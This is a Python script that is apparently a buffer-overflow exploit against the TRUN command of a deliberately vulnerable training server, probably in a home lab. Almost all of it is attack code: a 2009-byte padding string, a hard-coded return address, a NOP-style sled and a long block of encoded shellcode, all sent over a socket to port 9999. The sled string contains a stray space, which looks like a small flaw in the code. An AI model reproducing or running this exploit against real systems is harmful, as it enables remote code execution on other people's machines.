import socket
import sys
#625011af

overflowPayload = ("\xd9\xc2\xd9\x74\x24\xf4\x58\xbb\x06\x45\xe4\x39\x31\xc9\xb1"
"\x52\x31\x58\x17\x03\x58\x17\x83\xc6\x41\x06\xcc\x3a\xa1\x44"
"\x2f\xc2\x32\x29\xb9\x27\x03\x69\xdd\x2c\x34\x59\x95\x60\xb9"
"\x12\xfb\x90\x4a\x56\xd4\x97\xfb\xdd\x02\x96\xfc\x4e\x76\xb9"
"\x7e\x8d\xab\x19\xbe\x5e\xbe\x58\x87\x83\x33\x08\x50\xcf\xe6"
"\xbc\xd5\x85\x3a\x37\xa5\x08\x3b\xa4\x7e\x2a\x6a\x7b\xf4\x75"
"\xac\x7a\xd9\x0d\xe5\x64\x3e\x2b\xbf\x1f\xf4\xc7\x3e\xc9\xc4"
"\x28\xec\x34\xe9\xda\xec\x71\xce\x04\x9b\x8b\x2c\xb8\x9c\x48"
"\x4e\x66\x28\x4a\xe8\xed\x8a\xb6\x08\x21\x4c\x3d\x06\x8e\x1a"
"\x19\x0b\x11\xce\x12\x37\x9a\xf1\xf4\xb1\xd8\xd5\xd0\x9a\xbb"
"\x74\x41\x47\x6d\x88\x91\x28\xd2\x2c\xda\xc5\x07\x5d\x81\x81"
"\xe4\x6c\x39\x52\x63\xe6\x4a\x60\x2c\x5c\xc4\xc8\xa5\x7a\x13"
"\x2e\x9c\x3b\x8b\xd1\x1f\x3c\x82\x15\x4b\x6c\xbc\xbc\xf4\xe7"
"\x3c\x40\x21\xa7\x6c\xee\x9a\x08\xdc\x4e\x4b\xe1\x36\x41\xb4"
"\x11\x39\x8b\xdd\xb8\xc0\x5c\xe8\x3c\xc8\x96\x84\x3e\xcc\xb7"
"\x08\xb6\x2a\xdd\xa0\x9e\xe5\x4a\x58\xbb\x7d\xea\xa5\x11\xf8"
"\x2c\x2d\x96\xfd\xe3\xc6\xd3\xed\x94\x26\xae\x4f\x32\x38\x04"
"\xe7\xd8\xab\xc3\xf7\x97\xd7\x5b\xa0\xf0\x26\x92\x24\xed\x11"
"\x0c\x5a\xec\xc4\x77\xde\x2b\x35\x79\xdf\xbe\x01\x5d\xcf\x06"
"\x89\xd9\xbb\xd6\xdc\xb7\x15\x91\xb6\x79\xcf\x4b\x64\xd0\x87"
"\x0a\x46\xe3\xd1\x12\x83\x95\x3d\xa2\x7a\xe0\x42\x0b\xeb\xe4"
"\x3b\x71\x8b\x0b\x96\x31\xab\xe9\x32\x4c\x44\xb4\xd7\xed\x09"
"\x47\x02\x31\x34\xc4\xa6\xca\xc3\xd4\xc3\xcf\x88\x52\x38\xa2"
"\x81\x36\x3e\x11\xa1\x12")

stringToSend = "TRUN /.:/" + "A" * 2009 + "\xaf\x11\x50\x62" + "\x90 " * 32 + overflowPayload  # it may not work if we don't write x90 and 32 bit
try:
    Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Socket.connect(("192.168.56.1", 9999))  # must be 9999 port
    byte = stringToSend.encode("latin1")  # latin1 because sending byte
    Socket.send(byte)
    Socket.close()

except KeyboardInterrupt:
    sys.exit()

except Exception as e:
    print("Crashed at " + str(len(stringToSend)))
    print(e)
    sys.exit()


